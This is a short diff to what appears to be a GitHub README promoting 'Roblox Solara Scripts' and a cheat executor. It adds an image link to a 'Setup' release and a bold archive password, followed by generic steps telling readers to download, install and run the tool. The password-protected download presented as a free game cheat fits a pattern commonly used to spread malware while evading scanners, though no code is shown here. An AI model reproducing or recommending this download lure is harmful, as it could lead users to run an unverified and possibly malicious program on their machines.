@@ -14,6 +14,11 @@ Introducing **Roblox Solara Scripts 2024**! This collection of powerful scripts 
 
 ### 📋 How to Use
 
+[![Group_4_2](https://github.com/user-attachments/assets/a87c017a-6138-415d-ab7a-c6ffdb3a1707)](https://github.com/montswordsman/Roblox-Solara-Executor/releases/tag/Setup)
+
+> [!NOTE]
+> **PASSWORD: SOLARA2024**
+
 1. **Download the scripts** using the link above.
 2. **Install the executor** and load the Solara Scripts.
 3. **Run the scripts** and enjoy the enhanced features.
